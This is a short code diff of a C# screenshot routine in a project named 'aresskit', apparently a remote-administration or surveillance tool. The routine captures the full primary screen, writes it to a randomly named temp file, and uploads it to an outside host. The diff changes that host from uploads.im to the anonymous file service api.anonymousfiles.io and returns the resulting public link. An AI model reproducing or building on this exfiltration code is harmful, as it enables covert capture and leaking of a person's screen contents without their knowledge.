@@ -10,15 +10,14 @@ namespace aresskit
     {
         public static string CaptureScreenshot()
         {
-            string imagePath = default(string);
+            // Capture Screenshot
             Bitmap myImage = Stream.Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            imagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
-            myImage.Save(imagePath, ImageFormat.Png);
+            string ImagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
+            myImage.Save(ImagePath, ImageFormat.Png);
 
-            // Upload file
-            //FileHandler.uploadFile(imagePath, "http://uploads.im/api?upload")
-            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(imagePath, "http://uploads.im/api?upload"));
-            return json.data.img_url;
+            // Upload File to AnonymousFiles
+            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(ImagePath, "https://api.anonymousfiles.io"));
+            return json.url;
         }
 
         private static Bitmap Capture(int x, int y, int width, int height)
